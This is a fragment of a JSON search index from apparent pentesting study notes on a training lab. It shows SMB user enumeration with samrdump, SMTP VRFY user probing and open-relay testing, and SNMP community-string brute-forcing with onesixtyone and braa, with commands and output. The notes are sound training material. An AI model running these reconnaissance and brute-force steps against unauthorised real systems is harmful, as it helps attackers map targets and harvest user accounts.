(DEVSM)\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","SMBMap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/Samrdump/","title":"Samrdump","text":"<p>An alternative to this would be a Python script from Impacket called samrdump.py.</p>","tags":["Pentesting","Information_Gathering","Tools","SMB","Samrdump"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/Samrdump/#impacket-samrdumppy","title":"Impacket - Samrdump.py","text":"<pre><code>arenwald@htb[/htb]$ samrdump.py 10.129.14.128\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Retrieving endpoint list from 10.129.14.128\nFound domain(s):\n . DEVSMB\n . Builtin\n[*] Looking up users in domain DEVSMB\nFound user: mrb3n, uid = 1000\nFound user: cry0l1t3, uid = 1001\nmrb3n (1000)/FullName: \nmrb3n (1000)/UserComment: \nmrb3n (1000)/PrimaryGroupId: 513\nmrb3n (1000)/BadPasswordCount: 0\nmrb3n (1000)/LogonCount: 0\nmrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59\nmrb3n (1000)/PasswordDoesNotExpire: False\nmrb3n (1000)/AccountIsDisabled: False\nmrb3n (1000)/ScriptPath: \ncry0l1t3 (1001)/FullName: cry0l1t3\ncry0l1t3 (1001)/UserComment: \ncry0l1t3 (1001)/PrimaryGroupId: 513\ncry0l1t3 (1001)/BadPasswordCount: 0\ncry0l1t3 (1001)/LogonCount: 0\ncry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56\ncry0l1t3 (1001)/PasswordDoesNotExpire: False\ncry0l1t3 (1001)/AccountIsDisabled: False\ncry0l1t3 (1001)/ScriptPath: \n[*] Received 2 entries.\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","Samrdump"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Common%20Commands/","title":"Common Commands","text":"<p>The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.</p> Command Description <code>AUTH PLAIN</code> AUTH is a service extension used to authenticate the client. <code>HELO</code> The client logs in with its computer name and thus starts the session. <code>MAIL FROM</code> The client names the email sender. <code>RCPT TO</code> The client names the email recipient. <code>DATA</code> The client initiates the transmission of the email. <code>RSET</code> The client aborts the initiated transmission but keeps the connection between client and server. <code>VRFY</code> The client checks if a mailbox is available for message transfer. <code>EXPN</code> The client also checks if a mailbox is available for messaging with this command. <code>NOOP</code> The client requests a response from the server to prevent disconnection due to time-out. <code>QUIT</code> The client terminates the session. <p>To interact with the SMTP server, we can use the <code>telnet</code> tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, <code>HELO</code> or <code>EHLO</code>.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Common%20Commands/#telnet-heloehlo","title":"Telnet - HELO/EHLO","text":"<pre><code>arenwald@htb[/htb]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server \n\n\nHELO mail1.inlanefreight.htb\n\n250 mail1.inlanefreight.htb\n\n\nEHLO mail1\n\n250-mail1.inlanefreight.htb\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n</code></pre> <p>The command <code>VRFY</code> can be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue <code>code 252</code> and confirm the existence of a user that does not exist on the system. A list of all SMTP response codes can be found here.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Common%20Commands/#telnet-vrfy","title":"Telnet - VRFY","text":"<pre><code>arenwald@htb[/htb]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server \n\nVRFY root\n\n252 2.0.0 root\n\n\nVRFY cry0l1t3\n\n252 2.0.0 cry0l1t3\n\n\nVRFY testuser\n\n252 2.0.0 testuser\n\n\nVRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\n252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n</code></pre> <p>Therefore, one should never entirely rely on the results of automatic tools. After all, they execute pre-configured commands, but none of the functions explicitly state how the administrator configures the tested server.</p> <p>Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send would then look something like this: <code>CONNECT 10.129.14.128:25 HTTP/1.0</code></p> <p>All the commands we enter in the command line to send an email we know from every email client program like Thunderbird, Gmail, Outlook, and many others. We specify the <code>subject</code>, to whom the email should go, CC, BCC, and the information we want to share with others. Of course, the same works from the command line.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Common%20Commands/#send-an-email","title":"Send an Email","text":"<pre><code>arenwald@htb[/htb]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server\n\n\nEHLO inlanefreight.htb\n\n250-mail1.inlanefreight.htb\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n\n\nMAIL FROM: &lt;cry0l1t3@inlanefreight.htb&gt;\n\n250 2.1.0 Ok\n\n\nRCPT TO: &lt;mrb3n@inlanefreight.htb&gt; NOTIFY=success,failure\n\n250 2.1.5 Ok\n\n\nDATA\n\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n\nFrom: &lt;cry0l1t3@inlanefreight.htb&gt;\nTo: &lt;mrb3n@inlanefreight.htb&gt;\nSubject: DB\nDate: Tue, 28 Sept 2021 16:32:51 +0200\nHey man, I am trying to access our XY-DB but the creds don't work. \nDid you make any changes there?\n.\n\n250 2.0.0 Ok: queued as 6E1CF1681AB\n\n\nQUIT\n\n221 2.0.0 Bye\nConnection closed by foreign host.\n</code></pre> <p>The mail header is the carrier of a large amount of interesting information in an email. Among other things, it provides information about the sender and recipient, the time of sending and arrival, the stations the email passed on its way, the content and format of the message, and the sender and recipient.</p> <p>Some of this information is mandatory, such as sender information and when the email was created. Other information is optional. However, the email header does not contain any information necessary for technical delivery. It is transmitted as part of the transmission protocol. Both sender and recipient can access the header of an email, although it is not visible at first glance. The structure of an email header is defined by RFC5322.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.</p> <p>Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Dangerous%20Settings/#open-relay-configuration","title":"Open Relay Configuration","text":"<pre><code>mynetworks = 0.0.0.0/0\n</code></pre> <p>With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>The default Nmap scripts include <code>smtp-commands</code>, which uses the <code>EHLO</code> command to list all possible commands that can be executed on the target SMTP server.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Footprinting%20the%20Service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.14.128 -sC -sV -p25\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00025s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, \nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.09 seconds\n</code></pre> <p>However, we can also use the smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests. If we also print out the output of the scan in detail, we will also be able to see which tests the script is running.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Footprinting%20the%20Service/#nmap-open-relay","title":"Nmap - Open Relay","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST\nNSE: Loaded 1 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.00s elapsed\nInitiating ARP Ping Scan at 02:29\nScanning 10.129.14.128 [1 port]\nCompleted ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 02:29\nCompleted Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed\nInitiating SYN Stealth Scan at 02:29\nScanning 10.129.14.128 [1 port]\nDiscovered open port 25/tcp on 10.129.14.128\nCompleted SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports)\nNSE: Script scanning 10.129.14.128.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.07s elapsed\nNmap scan report for 10.129.14.128\nHost is up (0.00020s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n| smtp-open-relay: Server is an open relay (16/16 tests)\n|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@ESMTP&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.129.14.128]&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@ESMTP&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;\"relaytest@nmap.scanme.org\"&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;\"relaytest%nmap.scanme.org\"&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@[10.129.14.128]&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;\"relaytest@nmap.scanme.org\"@[10.129.14.128]&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@ESMTP&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;@[10.129.14.128]:relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;@ESMTP:relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.129.14.128]&gt;\n|_ MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@ESMTP&gt;\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nNSE: Script Post-scanning.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.48 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n</code></pre>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Footprinting%20the%20Service/#metasploit-smtp_enum","title":"Metasploit - smtp_enum","text":"<p>For user enumeration : <code>use auxiliary/scanner/smtp/smtp_enum</code></p> <p>Make sure to use a wordlist like <code>/usr/share/metasploit-framework/data/wordlists/unix_users.txt</code></p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Footprinting%20the%20Service/#smtp-user-enum","title":"smtp-user-enum","text":"<p><code>smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t &lt;IP&gt;</code></p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Postfix%20Default%20Configuration/","title":"Postfix Default Configuration","text":"<pre><code>arenwald@htb[/htb]$ cat /etc/postfix/main.cf | grep -v \"#\" | sed -r \"/^\\s*$/d\"\n\nsmtpd_banner = ESMTP Server \nbiff = no\nappend_dot_mydomain = no\nreadme_directory = no\ncompatibility_level = 2\nsmtp_tls_session_cache_database = btree:${data_directory}/smtp_scache\nmyhostname = mail1.inlanefreight.htb\nalias_maps = hash:/etc/aliases\nalias_database = hash:/etc/aliases\nsmtp_generic_maps = hash:/etc/postfix/generic\nmydestination = $myhostname, localhost \nmasquerade_domains = $myhostname\nmynetworks = 127.0.0.0/8 10.129.0.0/16\nmailbox_size_limit = 0\nrecipient_delimiter = +\nsmtp_bind_address = 0.0.0.0\ninet_protocols = ipv4\nsmtpd_helo_restrictions = reject_invalid_hostname\nhome_mailbox = /home/postfix\n</code></pre> <p>The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.</p> Command Description <code>AUTH PLAIN</code> AUTH is a service extension used to authenticate the client. <code>HELO</code> The client logs in with its computer name and thus starts the session. <code>MAIL FROM</code> The client names the email sender. <code>RCPT TO</code> The client names the email recipient. <code>DATA</code> The client initiates the transmission of the email. <code>RSET</code> The client aborts the initiated transmission but keeps the connection between client and server. <code>VRFY</code> The client checks if a mailbox is available for message transfer. <code>EXPN</code> The client also checks if a mailbox is available for messaging with this command. <code>NOOP</code> The client requests a response from the server to prevent disconnection due to time-out. <code>QUIT</code> The client terminates the session. <p>To interact with the SMTP server, we can use the <code>telnet</code> tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, <code>HELO</code> or <code>EHLO</code>.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMTP%20%2825%2C465%2C587%29/Protocol%20overview/","title":"Protocol overview","text":"<p>An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as <code>Mail User Agent</code> (<code>MUA</code>), converts it into a header and a body and uploads both to the SMTP server. This has a so-called <code>Mail Transfer Agent</code> (<code>MTA</code>), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a <code>Mail Submission Agent</code> (<code>MSA</code>), which checks the validity, i.e., the origin of the e-mail. This <code>MSA</code> is also called <code>Relay</code> server. These are very important later on, as the so-called <code>Open Relay Attack</code> can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.</p> <p>On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the <code>Mail delivery agent</code> (<code>MDA</code>) transfers it to the recipient's mailbox.</p> Client (<code>MUA</code>) <code>\u279e</code> Submission Agent (<code>MSA</code>) <code>\u279e</code> Open Relay (<code>MTA</code>) <code>\u279e</code> Mail Delivery Agent (<code>MDA</code>) <code>\u279e</code> Mailbox (<code>POP3</code>/<code>IMAP</code>) <p>But SMTP has two disadvantages inherent to the network protocol.</p> <ol> <li> <p>The first is that sending an email using SMTP does not return a usable delivery confirmation. Although the specifications of the protocol provide for this type of notification, its formatting is not specified by default, so that usually only an English-language error message, including the header of the undelivered message, is returned.</p> </li> <li> <p>Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). Today, many different security techniques are used to prevent the misuse of SMTP servers. For example, suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol DomainKeys (<code>DKIM</code>), the Sender Policy Framework (<code>SPF</code>).</p> </li> </ol> <p>For this purpose, an extension for SMTP has been developed called <code>Extended SMTP</code> (<code>ESMTP</code>). When people talk about SMTP in general, they usually mean ESMTP. ESMTP uses TLS, which is done after the <code>EHLO</code> command by sending <code>STARTTLS</code>. This initializes the SSL-protected SMTP connection, and from this moment on, the entire connection is encrypted, and therefore more or less secure. Now AUTH PLAIN extension for authentication can also be used safely.</p>","tags":["Pentesting","Information_Gathering","SMTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>Some dangerous settings that the administrator can make with SNMP are:</p> Settings Description <code>rwuser noauth</code> Provides access to the full OID tree without authentication. <code>rwcommunity &lt;community string&gt; &lt;IPv4 address&gt;</code> Provides access to the full OID tree regardless of where the requests were sent from. <code>rwcommunity6 &lt;community string&gt; &lt;IPv6 address&gt;</code> Same access as with <code>rwcommunity</code> with the difference of using IPv6.","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Default%20Configuration/","title":"Default Configuration","text":"<p>The default configuration of the SNMP daemon defines the basic settings for the service, which include the IP addresses, ports, MIB, OIDs, authentication, and community strings.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Default%20Configuration/#snmp-daemon-config","title":"SNMP Daemon Config","text":"<pre><code>arenwald@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v \"#\" | sed -r '/^\\s*$/d'\n\nsysLocation    Sitting on the Dock of the Bay\nsysContact     Me &lt;me@example.org&gt;\nsysServices    72\nmaster  agentx\nagentaddress  127.0.0.1,[::1]\nview   systemonly  included   .1.3.6.1.2.1.1\nview   systemonly  included   .1.3.6.1.2.1.25.1\nrocommunity  public default -V systemonly\nrocommunity6 public default -V systemonly\nrouser authPrivUser authpriv -V systemonly\n</code></pre> <p>The configuration of this service can also be changed in many ways. Therefore, we recommend setting up a VM to install and configure the SNMP server ourselves. All the settings that can be made for the SNMP daemon are defined and described in the manpage.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>For footprinting SNMP, we can use tools like <code>snmpwalk</code>, <code>onesixtyone</code>, and <code>braa</code>. <code>Snmpwalk</code> is used to query the OIDs with their information. <code>Onesixtyone</code> can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Footprinting%20the%20Service/#snmpwalk","title":"SNMPwalk","text":"<pre><code>arenwald@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128\n\niso.3.6.1.2.1.1.1.0 = STRING: \"Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10\niso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34\niso.3.6.1.2.1.1.4.0 = STRING: \"mrb3n@inlanefreight.htb\"\niso.3.6.1.2.1.1.5.0 = STRING: \"htb\"\niso.3.6.1.2.1.1.6.0 = STRING: \"Sitting on the Dock of the Bay\"\niso.3.6.1.2.1.1.7.0 = INTEGER: 72\niso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1\niso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1\niso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1\niso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1\niso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1\niso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49\niso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4\niso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50\niso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3\niso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92\niso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\"\niso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\"\niso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\"\niso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\"\niso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\"\niso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\"\niso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\"\niso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\"\niso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\"\niso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\"\niso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78\niso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 \niso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216\niso.3.6.1.2.1.25.1.4.0 = STRING: \"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash\"\niso.3.6.1.2.1.25.1.5.0 = Gauge32: 3\niso.3.6.1.2.1.25.1.6.0 = Gauge32: 411\niso.3.6.1.2.1.25.1.7.0 = INTEGER: 0\niso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)\n\n...SNIP...\n\niso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: \"printer-driver-sag-gdi_0.1-7_all\"\niso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: \"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: \"procps_2:3.3.16-1ubuntu2.3_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: \"proftpd-basic_1.3.6c-2_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: \"proftpd-doc_1.3.6c-2_all\"\niso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: \"psmisc_23.3-1_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: \"publicsuffix_20200303.0012-1_all\"\niso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: \"pulseaudio_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: \"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: \"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: \"python-apt-common_2.0.0ubuntu0.20.04.6_all\"\niso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: \"python3_3.8.2-0ubuntu2_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: \"python3-acme_1.1.0-1_all\"\niso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: \"python3-apport_2.20.11-0ubuntu27.21_all\"\niso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: \"python3-apt_2.0.0ubuntu0.20.04.6_amd64\" \n\n...SNIP...\n</code></pre> <p>In the case of a misconfiguration, we would get approximately the same results from <code>snmpwalk</code> as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example.</p> <p>Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use <code>onesixtyone</code> and <code>SecLists</code> wordlists to identify these community strings.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Footprinting%20the%20Service/#onesixtyone","title":"OneSixtyOne","text":"<pre><code>arenwald@htb[/htb]$ sudo apt install onesixtyone\narenwald@htb[/htb]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128\n\nScanning 1 hosts, 3220 communities\n10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64\n</code></pre> <p>Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool crunch to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module Cracking Passwords With Hashcat.</p> <p>Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.</p>","tags":["Pentesting","Information_Gathering","SNMP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SNMP%20%28161%2C162%2C10161%2C10162%29/Footprinting%20the%20Service/#braa","title":"Braa","text":"<pre><code>arenwald@htb[/htb]$ sudo apt install braa\narenwald@htb[/htb]$ braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax\narenwald@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*\n\n10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\n10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10\n10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548\n10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb\n10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb\n10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US\n10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78\n...SNIP...\n</code></pre> 